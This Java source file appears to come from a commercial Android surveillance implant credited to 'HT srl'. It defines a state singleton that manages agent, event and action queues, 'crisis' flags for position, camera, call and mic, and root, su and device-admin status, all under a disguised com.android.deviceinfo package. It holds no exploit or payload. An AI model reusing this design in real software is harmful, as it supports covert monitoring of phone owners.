/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.deviceinfo;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.Semaphore;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.os.Handler;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.provider.MediaStore.Images.Media;

import com.android.deviceinfo.action.Action;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfEvent;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.conf.Globals;
import com.android.deviceinfo.event.BaseEvent;
import com.android.deviceinfo.gui.AGUI;
import com.android.deviceinfo.gui.DeviceAdminRequest;
import com.android.deviceinfo.gui.Preview;
import com.android.deviceinfo.module.ModuleCrisis;
import com.android.deviceinfo.util.Check;

// Singleton Class
/**
 * The Class Status.
 */
public class Status {
	private static final String TAG = "Status"; //$NON-NLS-1$

	/** The agents map. */
	private static HashMap<String, ConfModule> agentsMap;

	/** The events map. */
	private static HashMap<Integer, ConfEvent> eventsMap;

	/** The actions map. */
	private static HashMap<Integer, Action> actionsMap;

	private static Globals globals;

	/** The triggered actions. */
	private static ArrayList<?>[] triggeredActions = new ArrayList<?>[Action.NUM_QUEUE];

	/** The synced. */
	static public boolean synced;

	/** The drift. */
	static public int drift;

	/** The context. */
	private static Context context;

	/** For forward compatibility versus 8.0 */
	public static boolean calllistCreated = false;

	static Object lockCrisis = new Object();
	static private boolean crisis = false;
	static private boolean[] crisisType = new boolean[ModuleCrisis.SIZE];
	static private boolean haveRoot = false, haveSu = false;

	private static Object[] triggeredSemaphore = new Object[Action.NUM_QUEUE];

	static public boolean uninstall;

	static WakeLock wl;

	private boolean deviceAdmin;

	/**
	 * Instantiates a new status.
	 */
	private Status() {
		agentsMap = new HashMap<String, ConfModule>();
		eventsMap = new HashMap<Integer, ConfEvent>();
		actionsMap = new HashMap<Integer, Action>();

		for (int i = 0; i < Action.NUM_QUEUE; i++) {
			triggeredSemaphore[i] = new Object();
			triggeredActions[i] = new ArrayList<Integer>();
		}

	}

	/** The singleton. */
	private volatile static Status singleton;

	private static DeviceAdminRequest gui;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static Status self() {
		if (singleton == null) {
			synchronized (Status.class) {
				if (singleton == null) {
					singleton = new Status();
				}
			}
		}

		return singleton;
	}

	/**
	 * Clean.
	 */
	static public void clean() {
		agentsMap.clear();
		eventsMap.clear();
		actionsMap.clear();
		globals = null;
		uninstall = false;

		// Forward compatibility
		calllistCreated = false;
	}

	/**
	 * Sets the app context.
	 * 
	 * @param context
	 *            the new app context
	 */
	public static void setAppContext(final Context context) {
		if (Cfg.DEBUG) {
			Check.requires(context != null, "Null Context"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (setAppContext), " + context.getPackageName());
		}

		Status.context = context;

		if (Cfg.POWER_MANAGEMENT) {
			final PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
			wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
		}
	}

	/**
	 * Gets the app context.
	 * 
	 * @return the app context
	 */
	public static Context getAppContext() {
		if (Cfg.DEBUG) {
			Check.requires(context != null, "Null Context"); //$NON-NLS-1$
		}

		return context;
	}

	public static void setAppGui(DeviceAdminRequest applicationContext) {
		setAppContext(applicationContext.getAppContext());
		Status.gui = applicationContext;
	}

	public static DeviceAdminRequest getAppGui() {
		return gui ;
	}

	public static ContentResolver getContentResolver() {
		return context.getContentResolver();

	}

	static public Handler getDefaultHandler() {
		return deafultHandler;
	}

	// Add an agent to the map
	/**
	 * Adds the agent.
	 * 
	 * @param a
	 *            the a
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public static void addAgent(final ConfModule a) throws GeneralException {
		if (agentsMap.containsKey(a.getType()) == true) {
			// throw new RCSException("Agent " + a.getId() + " already loaded");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Substituing agent: " + a); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		final String key = a.getType();
		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		agentsMap.put(a.getType(), a);
	}

	// Add an event to the map
	/**
	 * Adds the event.
	 * 
	 * @param e
	 *            the e
	 * @return
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public static boolean addEvent(final ConfEvent e) {
		if (Cfg.DEBUG) {
			//Check.log(TAG + " addEvent "); //$NON-NLS-1$
		}
		// Don't add the same event twice
		if (eventsMap.containsKey(e.getId()) == true) {
			// throw new RCSException("Event " + e.getId() + " already loaded");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Substituing event: " + e); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		eventsMap.put(e.getId(), e);
		return true;
	}

	// Add an action to the map
	/**
	 * Adds the action.
	 * 
	 * @param a
	 *            the a
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public static void addAction(final Action a) {
		// Don't add the same action twice
		if (Cfg.DEBUG) {
			Check.requires(!actionsMap.containsKey(a.getId()), "Action " + a.getId() + " already loaded"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		actionsMap.put(a.getId(), a);
	}

	static public void setGlobal(Globals g) {
		globals = g;
	}

	/**
	 * Gets the actions number.
	 * 
	 * @return the actions number
	 */
	static public int getActionsNumber() {
		return actionsMap.size();
	}

	/**
	 * Gets the agents number.
	 * 
	 * @return the agents number
	 */
	static public int getAgentsNumber() {
		return agentsMap.size();
	}

	/**
	 * Gets the events number.
	 * 
	 * @return the events number
	 */
	static public int getEventsNumber() {
		return eventsMap.size();
	}

	/**
	 * Gets the agents map.
	 * 
	 * @return the agents map
	 */
	static public HashMap<String, ConfModule> getAgentsMap() {
		return agentsMap;
	}

	/**
	 * Gets the events map.
	 * 
	 * @return the events map
	 */
	static public HashMap<Integer, ConfEvent> getEventsMap() {
		return eventsMap;
	}

	/**
	 * Gets the actions map.
	 * 
	 * @return the actions map
	 */
	static public HashMap<Integer, Action> getActionsMap() {
		return actionsMap;
	}

	/**
	 * Gets the action.
	 * 
	 * @param index
	 *            the index
	 * @return the action
	 * @throws GeneralException
	 *             the RCS exception
	 */
	static public Action getAction(final int index) throws GeneralException {
		if (actionsMap.containsKey(index) == false) {
			throw new GeneralException(index + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final Action a = actionsMap.get(index);

		if (a == null) {
			throw new GeneralException(index + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return a;
	}

	/**
	 * Gets the event.
	 * 
	 * @param id
	 *            the id
	 * @return the event
	 * @throws GeneralException
	 *             the RCS exception
	 */
	static public ConfEvent getEvent(final int id) throws GeneralException {
		if (eventsMap.containsKey(id) == false) {
			throw new GeneralException(id + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final ConfEvent e = eventsMap.get(id);

		if (e == null) {
			throw new GeneralException(id + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return e;
	}

	/**
	 * Gets the option.
	 * 
	 * @param id
	 *            the id
	 * @return the option
	 * @throws GeneralException
	 *             the RCS exception
	 */
	static public Globals getGlobals() {
		return globals;
	}

	/**
	 * Trigger action.
	 * 
	 * @param i
	 *            the i
	 * @param baseEvent
	 */

	static public void triggerAction(final int i, BaseEvent baseEvent) {
		if (Cfg.DEBUG) {
			Check.requires(actionsMap != null, " (triggerAction) Assert failed, null actionsMap");
		}

		Action action = actionsMap.get(new Integer(i));

		if (Cfg.DEBUG) {
			Check.asserts(action != null, " (triggerAction) Assert failed, null action");
		}

		int qq = action.getQueue();
		@SuppressWarnings("unchecked")
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		Object tsem = triggeredSemaphore[qq];

		if (Cfg.DEBUG)
			Check.asserts(act != null, "triggerAction, null act");
		if (Cfg.DEBUG)
			Check.asserts(tsem != null, "triggerAction, null tsem");

		Trigger trigger = new Trigger(i, baseEvent);
		synchronized (act) {
			if (!act.contains(trigger)) {
				act.add(new Trigger(i, baseEvent));
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (triggerAction): notifing queue: " + qq);
		}
		synchronized (tsem) {
			try {
				tsem.notifyAll();
			} catch (final Exception ex) {
				if (Cfg.EXCEPTION) {
					Check.log(ex);
				}

				if (Cfg.DEBUG) {
					Check.log(ex);//$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Gets the triggered actions.
	 * 
	 * @return the triggered actions
	 */
	static public Trigger[] getTriggeredActions(int qq) {
		if (Cfg.DEBUG)
			Check.asserts(qq >= 0 && qq < Action.NUM_QUEUE, "getTriggeredActions qq: " + qq);

		@SuppressWarnings("unchecked")
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		Object tsem = triggeredSemaphore[qq];

		if (Cfg.DEBUG)
			Check.asserts(tsem != null, "getTriggeredActions null tsem");

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getTriggeredActions): waiting on sem: " + qq);
			}
			synchronized (tsem) {
				if (act.size() == 0) {
					tsem.wait();
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getTriggeredActions): have act not empty, don't wait");
					}
				}
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);
				Check.log(TAG + " Error: " + " getActionIdTriggered: " + e); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		synchronized (tsem) {
			final int size = act.size();
			final Trigger[] triggered = new Trigger[size];

			for (int i = 0; i < size; i++) {
				triggered[i] = act.get(i);
			}

			return triggered;
		}
	}

	/**
	 * Dangerous, DO NOT USE
	 * 
	 * @param qq
	 * @return
	 */
	@Deprecated
	static public Trigger[] getNonBlockingTriggeredActions(int qq) {
		@SuppressWarnings("unchecked")
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		final int size = act.size();
		final Trigger[] triggered = new Trigger[size];

		for (int i = 0; i < size; i++) {
			triggered[i] = act.get(i);
		}

		return triggered;
	}

	/**
	 * Un trigger action.
	 * 
	 * @param action
	 *            the action
	 */
	static public void unTriggerAction(final Action action) {
		int qq = action.getQueue();
		@SuppressWarnings("unchecked")
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		Object sem = triggeredSemaphore[qq];

		Trigger trigger = new Trigger(action.getId(), null);
		synchronized (act) {
			if (act.contains(trigger)) {
				act.remove(trigger);
			}
		}
		synchronized (sem) {
			try {
				sem.notifyAll();
			} catch (final Exception ex) {
				if (Cfg.EXCEPTION) {
					Check.log(ex);
				}

				if (Cfg.DEBUG) {
					Check.log(ex);//$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Un trigger all.
	 */
	static public void unTriggerAll() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (unTriggerAll)"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		for (int qq = 0; qq < Action.NUM_QUEUE; qq++) {
			@SuppressWarnings("unchecked")
			ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
			Object sem = triggeredSemaphore[qq];

			synchronized (act) {
				act.clear();
			}
			synchronized (sem) {
				try {
					sem.notifyAll();
				} catch (final Exception ex) {
					if (Cfg.EXCEPTION) {
						Check.log(ex);
					}

					if (Cfg.DEBUG) {
						Check.log(ex);//$NON-NLS-1$
					}
				}
			}
		}

	}

	static public synchronized void setCrisis(int type, boolean value) {
		synchronized (lockCrisis) {
			crisisType[type] = value;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " setCrisis: " + type); //$NON-NLS-1$
		}
	}

	static private boolean isCrisis() {
		synchronized (lockCrisis) {
			return crisis;
		}
	}

	static public boolean crisisPosition() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.POSITION]);
		}
	}

	static public boolean crisisCamera() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.CAMERA]);
		}
	}

	static public boolean crisisCall() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.CALL]);
		}
	}

	static public boolean crisisMic() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.MIC]);
		}
	}

	static public boolean crisisSync() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.SYNC]);
		}
	}

	/**
	 * Start crisis.
	 */
	static public void startCrisis() {
		synchronized (lockCrisis) {
			crisis = true;
		}
	}

	/**
	 * Stop crisis.
	 */
	static public void stopCrisis() {
		synchronized (lockCrisis) {
			crisis = false;
		}
	}

	static public boolean haveRoot() {
		return haveRoot;
	}

	static public void setRoot(boolean r) {
		haveRoot = r;
	}

	static public boolean haveSu() {
		return haveSu;
	}

	static public void setSu(boolean s) {
		haveSu = s;
	}

	static public ScheduledExecutorService getStpe() {
		return Executors.newScheduledThreadPool(1);
	}

	static Handler deafultHandler = new Handler();

	public void acquirePowerLock() {
		if (Cfg.POWER_MANAGEMENT) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (acquirePowerLock)");
				Check.requires(wl != null, "null wl");
			}
			if (wl != null) {
				wl.acquire(1000);
			}
		}
	}

	public void releasePowerLock() {
		if (Cfg.POWER_MANAGEMENT) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (releasePowerLock)");
				Check.requires(wl != null, "null wl");
			}
			if (wl != null && wl.isHeld()) {
				wl.release();
			}
		}
	}

	public synchronized void setDeviceAdmin(boolean value) {
		deviceAdmin = value;
	}

	public synchronized boolean getDeviceAdmin() {
		return deviceAdmin;
	}

}
